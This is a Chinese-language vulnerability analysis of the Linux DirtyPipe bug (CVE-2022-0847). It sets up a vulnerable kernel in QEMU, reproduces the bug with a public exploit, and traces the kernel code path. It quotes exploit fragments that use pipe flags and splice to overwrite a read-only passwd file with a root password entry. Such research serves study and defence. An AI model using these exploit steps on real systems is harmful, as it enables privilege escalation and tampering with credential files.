version="1.0" encoding="utf-8"?

# DirtyPIPE漏洞分析从0到1

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzU1NzcxNjAyMQ==&mid=2247484718&idx=1&sn=6555815b833970a610a98db06cf2d0f3&chksm=fc30c274cb474b6227e1cc2977a8fdfee94d5f97981a411d4f2889d0b4fbdc0cae5a70644de7&scene=126&sessionid=1681400517#rd](http://mp.weixin.qq.com/s?__biz=MzU1NzcxNjAyMQ==&mid=2247484718&idx=1&sn=6555815b833970a610a98db06cf2d0f3&chksm=fc30c274cb474b6227e1cc2977a8fdfee94d5f97981a411d4f2889d0b4fbdc0cae5a70644de7&scene=126&sessionid=1681400517#rd)

> 水平有限，如有错误欢迎联系指正vx:1084099570 或 bigric3\_

  

## 1\. 环境搭建

  

### 1）编译内核

*   
*   
*   
*   
*   
*   
*   

```
# 补丁信息# https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=9d2231c5d74e13b2a0546fee6737ee4446017903&id2=e783362eb54cd99b2cac8b3a9aeac942e6f6ac07git  clone https://github.com/torvalds/linux.git#切换到漏洞版本git  checkout e783362eb54cd99b2cac8b3a9aeac942e6f6ac07make x86_64_defconfigmake menuconfig
```

设置编译选项

•Compile the kernel with debug info•Provide GDB scripts for kernel debugging

编译

•make -j8

  

### 2）编译bzbox

*   
*   
*   
*   
*   

```
wget https://busybox.net/downloads/busybox-1.35.0.tar.bz2tar -jxf busybox-1.35.0.tar.bz2make menuconfigmake -j8make install
```

编译完成后，生成的文件系统在`./install`目录下，创建目录及初始化脚本

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
# mkdir -p  proc sys dev etc/init.d# vim ./init# cat ./init  #!/bin/sh  echo "INIT SCRIPT"  mkdir /tmp  mount -t proc none /proc  mount -t sysfs none /sys  mount -t devtmpfs none /dev  mount -t debugfs none /sys/kernel/debug  mount -t tmpfs none /tmp  echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"  setsid /bin/cttyhack setuidgid 1000 /bin/sh
```

打包文件系统

*   
*   
*   
*   
*   

```
chmod +x ./init# 将作者的poc复制到文件系统，需要静态编译-staticcp ../../../vulns/DirtyPipe/writer ./cp ../../../vulns/DirtyPipe/splicer ./find . | cpio -o --format=newc > ../../rootfs.img
```

启动脚本

*   
*   
*   
*   
*   
*   
*   
*   
*   

```
#!/bin/shqemu-system-x86_64 \    -m 64M \    -nographic \    -kernel ./linux_knl/linux/arch/x86/boot/bzImage \    -initrd  ./rootfs.img \    -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr" \    -smp cores=2,threads=1 \    -cpu kvm64
```

  

## 2\. 复现问题

进入虚拟机后，启动poc，测试作者的poc失败，不分析

*   
*   
*   

```
./writer >/tmp/foo &./splicer </tmp/foo |cat >/dev/null &head -n10 /tmp/foo
```

测试作者的exploit^(\[1\])，只是测试一下越权任意文件写的能力，在busybox中创建如下target

*   
*   
*   
*   
*   
*   

```
/ $ ls -l ./etc/passwd1-rw-r--r-- 1 root root 90 Mar  8 17:23 ./etc/passwd1/ $ cat ./etc/passwd1aaaa bbbbbbbbbbbbbbbbbbbbbbbbaaaa bbbbbbbbbbbbbbbbbbbbbbbbaaaa bbbbbbbbbbbbbbbbbbbbbbbb
```

启动虚拟机，执行exp，成功修改了644权限的passwd1文件

*   
*   
*   
*   
*   
*   
*   
*   
*   

```
/ $ ./expBacking up /etc/passwd1 to /tmp/passwd1.bak ...Setting root password to "aaron"...system() function call seems to have failed :(/ $ cat /etc/passwd1aaaa:$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/shaaaa bbbbbbbbbbbbbbbbbbbbbbbb/ $ iduid=1000 gid=1000 groups=1000
```

  

## 3\. 分析

  

### 1）结论

**先创建带**`PIPE_BUF_FLAG_CAN_MERGE`**标签的pipe\_buf**，**然后利用**`splice`**底层的零拷贝机制，**`splice`**调用**`copy_page_to_iter_pipe`**完成pipe\_buf的页和目标文件page\_cache的绑定，且完成绑定后未置空pipe\_buf的flags，最后利用pipe\_write对带**`PIPE_BUF_FLAG_CAN_MERGE`**标签的pipe\_buf写时，直接获取pipe\_buf的页引用，且写时不存在权限检查，最后导致了越权写任意文件任意数据，准确的说是写任意具有读权限的文件任意数据（因为splice底层实现，校验了file的读属性）。**

  

### 2）补丁信息

漏洞的引入在commit^(\[2\])，修改了匿名管道缓冲区的merge属性的设置，引入了属性`PIPE_BUF_FLAG_CAN_MERGE`，同样在漏洞的补丁^(\[3\])里，对管道的缓冲区的flags进行了初始化设置为0，如下

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
diff --git a/lib/iov_iter.c b/lib/iov_iter.cindex b0e0acdf96c15..6dd5330f7a995 100644--- a/lib/iov_iter.c+++ b/lib/iov_iter.c@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by         return 0;
     buf->ops = &page_cache_pipe_buf_ops;+    buf->flags = 0;     get_page(page);     buf->page = page;     buf->offset = offset;@@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size,             break;
         buf->ops = &default_pipe_buf_ops;+        buf->flags = 0;         buf->page = page;         buf->offset = 0;         buf->len = min_t(ssize_t, left, PAGE_SIZE);
```

根据作者的说法，在commit 241699cd72a8 “new iov\_iter flavour: pipe-backed” (Linux 4.9, 2016)^(\[4\])中新增的两个函数即可实现任意设置`pipe_buffer`的属性，但是并不能造成什么实际的影响，直到linux5.8的commit引入了可以注入`PIPE_BUF_FLAG_CAN_MERGE`。

下面对着Linux源码和作者公开的exploit调试分析一下。

### 3）创建带`PIPE_BUF_FLAG_CAN_MERGE`的空pipe_buf

exp中的代码如下

*   
*   
*   
*   
*   
*   

```
    // 将pipe的缓冲区全部打上标签，因为pipe的缓冲区是环形数组，每个成员指向一个内存页    for (unsigned r = pipe_size; r > 0;) {        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;        write(p[1], buffer, n);        r -= n;    }
```

`write`在内核中调用`pipe_write`，pipe的缓冲区在内核中的实现是一个环形数组，数组的每个元素映射一个内存页。只要缓冲区未满则向管道写入数据，非direct io模式会打上flag`PIPE_BUF_FLAG_CAN_MERGE`

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
// pipe.c#414static ssize_tpipe_write(struct kiocb *iocb, struct iov_iter *from){    // ...    // #488: pipe缓冲区未满    if (!pipe_full(head, pipe->tail, pipe->max_usage)) {        unsigned int mask = pipe->ring_size - 1;
        // 获取pipe的缓冲区及pipe的临时页tmp_page，后续用于pipe_buf的初始化        struct pipe_buffer *buf = &pipe->bufs[head & mask];        struct page *page = pipe->tmp_page;
        // #519: 初始化buf        /* Insert it into the buffer array */        buf = &pipe->bufs[head & mask];        buf->page = page;        buf->ops = &anon_pipe_buf_ops;        buf->offset = 0;        buf->len = 0;
        // #525: 非DIRECT IO，利用OS的Page Cache向另端写，同时打上PIPE_BUF_FLAG_CAN_MERGE        if (is_packetized(filp)            buf->flags = PIPE_BUF_FLAG_PACKET;        else            buf->flags = PIPE_BUF_FLAG_CAN_MERGE;

```

后续通过read读空pipe管道缓冲区

*   
*   
*   
*   
*   
*   
*   

```
    /* drain the pipe, freeing all pipe_buffer instances (but       leaving the flags initialized) */    for (unsigned r = pipe_size; r > 0;) {        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;        read(p[0], buffer, n);        r -= n;    }
```

  

### 4）利用`splice`的零拷贝绑定pipe_buf->page到page_cache

继续，exp中通过`splice`底层的零拷贝机制，将pipe的buf_page引用到文件的page_cache

*   
*   
*   
*   
*   
*   
*   
*   
*   

```
    /* open the input file and validate the specified offset */    const int fd = open(path, O_RDONLY); // yes, read-only! :-)
    /* splice one byte from before the specified offset into the       pipe; this will add a reference to the page cache, but       since copy_page_to_iter_pipe() does not initialize the       "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */    --offset;    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
```

如上代码，splice的参数1为644权限的文件passwd1的句柄，参数3为pipe的写入端，即读取passwd1的数据到pipe管道中。splice在内核中调用函数`do_splice`

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
// splice.c#1025/* * Determine where to splice to/from. */long do_splice(struct file *in, loff_t *off_in, struct file *out,           loff_t *off_out, size_t len, unsigned int flags){    // ...    // #1036: 判断in是否具有读权限，out是否具有写权限。    //        权限检查失败则return    if (unlikely(!(in->f_mode & FMODE_READ) ||                 !(out->f_mode & FMODE_WRITE)))        return -EBADF;
    // 获取in和out的pipe指针，实际上是针对pipe类型文件才具有，    // create_pipe_files时会保留pipe的指针在FILE结构的private_data中    // 根据exp分析，这里ipipe会为null，而opipe获取成功    ipipe = get_pipe_info(in, true);    opipe = get_pipe_info(out, true);
    // 管道对接管道     if (ipipe && opipe) {    // ...        return splice_pipe_to_pipe(ipipe, opipe, len, flags);    }
    // 只有入方向为管道    if (ipipe && opipe) {       // ...        file_start_write(out);        ret = do_splice_from(ipipe, out, &offset, len, flags);        file_end_write(out);    }
    // #1090: 出方向为管道    if (opipe) {        if (off_out)            return -ESPIPE;        if (off_in) {
            // 需要in具有读权限            if (!(in->f_mode & FMODE_PREAD))                return -EINVAL;            offset = *off_in;        } else {            offset = in->f_pos;        }
        if (out->f_flags & O_NONBLOCK)            flags |= SPLICE_F_NONBLOCK;
        // 调用splice_file_to_pipe        ret = splice_file_to_pipe(in, opipe, &offset, len, flags);

```

`do_splice`调用`splice_file_to_pipe`

*   
*   
*   
*   
*   
*   
*   
*   

```
// splice.c#1008long splice_file_to_pipe(struct file *in,             struct pipe_inode_info *opipe,             loff_t *offset,             size_t len, unsigned int flags){    // ...     ret = do_splice_to(in, offset, opipe, len, flags);
```

`do_splice`调用如下  
\==>`splice_file_to_pipe()`  
\====>`do_splice_to()`  
\======> `in->f_op->splice_read(in, ppos, pipe, len, flags);` // generic_file_splice_read()  
\=========> `call_read_iter()`  
\=============> `file->f_op->read_iter()` // generic_file_read_iter()  
\================> `filemap_read()` // generic_file_read_iter对非direct io模式调用filemap_read

看函数`filemap_read`

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
// filemap.c#2629/** * filemap_read - Read data from the page cache. * @iocb: The iocb to read. * @iter: Destination for the data. * @already_read: Number of bytes already read by the caller. * * Copies data from the page cache.  If the data is not currently present, * uses the readahead and readpage address_space operations to fetch it. * * Return: Total number of bytes copied, including those already read by * the caller.  If an error happens before any bytes are copied, returns * a negative error number. */ssize_t filemap_read(struct kiocb *iocb, struct iov_iter *iter,        ssize_t already_read){    // ...    // #2676: 将in文件的page_cache保存在结构体struct folio_batch fbatch中    error = filemap_get_pages(iocb, iter, &fbatch);
    // #2707: 遍历文件缓存页，调用copy_folio_to_iter    for (i = 0; i < folio_batch_count(&fbatch); i++) {        struct folio *folio = fbatch.folios[i];        size_t fsize = folio_size(folio);        size_t offset = iocb->ki_pos & (fsize - 1);        size_t bytes = min_t(loff_t, end_offset - iocb->ki_pos,                             fsize - offset);        size_t copied;
        if (end_offset < folio_pos(folio))            break;        if (i > 0)            folio_mark_accessed(folio);        /*             * If users can be writing to this folio using arbitrary             * virtual addresses, take care of potential aliasing             * before reading the folio on the kernel side.             */        if (writably_mapped)            flush_dcache_folio(folio);
        copied = copy_folio_to_iter(folio, offset, bytes, iter);
```

`copy_folio_to_iter(folio, offset, bytes, iter);`继续调用：  
\====> `copy_page_to_iter(&folio->page, offset, bytes, i);`  
\=======> `__copy_page_to_iter(page, offset,min(bytes, (size_t)PAGE_SIZE - offset), i);`

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
//iov_iter.c#846static size_t __copy_page_to_iter(struct page *page, size_t offset, size_t bytes,             struct iov_iter *i){    if (likely(iter_is_iovec(i)))        return copy_page_to_iter_iovec(page, offset, bytes, i);    if (iov_iter_is_bvec(i) || iov_iter_is_kvec(i) || iov_iter_is_xarray(i)) {        void *kaddr = kmap_local_page(page);        size_t wanted = _copy_to_iter(kaddr + offset, bytes, i);        kunmap_local(kaddr);        return wanted;    }    if (iov_iter_is_pipe(i))        return copy_page_to_iter_pipe(page, offset, bytes, i);
```

这里时文件向pipe copy，所以调用`copy_page_to_iter_pipe`，细心的同学或许发现了此处正是补丁修补位置之一，看`copy_page_to_iter_pipe`代码：

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes,             struct iov_iter *i){    // ...    buf = &pipe->bufs[i_head & p_mask];    if (off) {        if (offset == off && buf->page == page) {            /* merge with the last one */            buf->len += bytes;            i->iov_offset += bytes;            goto out;        }        i_head++;        buf = &pipe->bufs[i_head & p_mask];    }    if (pipe_full(i_head, p_tail, pipe->max_usage))        return 0;
    buf->ops = &page_cache_pipe_buf_ops;    get_page(page);    buf->page = page;    buf->offset = offset;    buf->len = bytes;
```

如上代码可以看到，仅仅时完成了pipe\_buf->page到page的引用，并没有实际的copy，完成零拷贝的同时完成的页绑定，调试获取此时`buf->page`引用的页地址

*   
*   
*   
*   
*   
*   

```
gef➤  p *(struct folio_batch*)fbatch$12 = {  nr = 0x1,   percpu_pvec_drained = 0x0,   folios = {0xffffea0000034800, 0xffff888003262b00, 0x10 <fixed_percpu_data+16>, 0xffffc900001cfe58, 0xffff888003262b00, 0x0 <fixed_percpu_data>, 0x20000 <ftrace_stacks+6304>, 0xffff8880006fd7c0, 0x0 <fixed_percpu_data>, 0x0 <fixed_percpu_data>, 0x4004 <irq_stack_backing_store+8196>, 0x0 <fixed_percpu_data>, 0xffffc900001cfd80, 0xffffc900001cfda8, 0xffffffffffffffff}}
```

![](../Images/3351e29c1b9e30170106d15b360ea177.png "null")

### 5）越权写

继续看exp中的代码

*   
*   
*   
*   
*   
*   
*   
*   

```
    const char *const data = ":$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n";       // openssl passwd1 -1 -salt aaron aaron     printf("Setting root password to \"aaron\"...\n");    const size_t data_size = strlen(data);
    /* the following write will not create a new pipe_buffer, but       will instead write into the page cache, because of the       PIPE_BUF_FLAG_CAN_MERGE flag */    nbytes = write(p[1], data, data_size);
```

`write`写管道内核中调用`pipe_write`

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
//pipe.c#414static ssize_tpipe_write(struct kiocb *iocb, struct iov_iter *from){    // ...    if ((buf->flags & PIPE_BUF_FLAG_CAN_MERGE) &&        offset + chars <= PAGE_SIZE) {        ret = pipe_buf_confirm(pipe, buf);        if (ret)            goto out;
        ret = copy_page_from_iter(buf->page, offset, chars, from);        if (unlikely(ret < chars)) {
```

下个断点，获取`copy_page_from_iter()`参数`buf->page`的值，和前面`splice`中绑定的页是一致的  
![](../Images/ac85f4f9c7f39ce611e791df908268ad.png "null")  
这里向管道写时没有权限校验的，且`buf->flags`存在`PIPE_BUF_FLAG_CAN_MERGE`时，直接调用`copy_page_from_iter`完成从pipe缓冲区到文件页的拷贝。  
如果没有这个标签的话，实际上会往`pipe->tmp_page`去写，此时就不会写到目标文件中。

  

## 4\. 参考

https://dirtypipe.cm4all.com/

### References

`[1]` exploit: *https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c*  
`[2]` commit: *https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958*  
`[3]` 补丁: *https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=9d2231c5d74e13b2a0546fee6737ee4446017903&id2=e783362eb54cd99b2cac8b3a9aeac942e6f6ac07*  
`[4]` commit 241699cd72a8 “new iov_iter flavour: pipe-backed” (Linux 4.9, 2016): *https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b*